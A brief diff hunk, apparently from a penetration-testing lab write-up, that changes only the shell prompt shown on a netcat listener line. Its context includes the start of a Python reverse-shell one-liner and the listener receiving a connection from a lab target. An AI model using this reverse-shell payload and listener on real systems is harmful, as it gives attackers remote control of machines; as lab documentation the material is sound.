@@ -364,7 +364,7 @@ import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s
 ```
 on kali
 ```console
-kali@kali:~$ nc -nvlp 6969
+bibo318@parrot:~$ nc -nvlp 6969
 listening on [any] 6969 ...
 
 connect to [10.10.14.43] from (UNKNOWN) [10.10.10.123] 53932
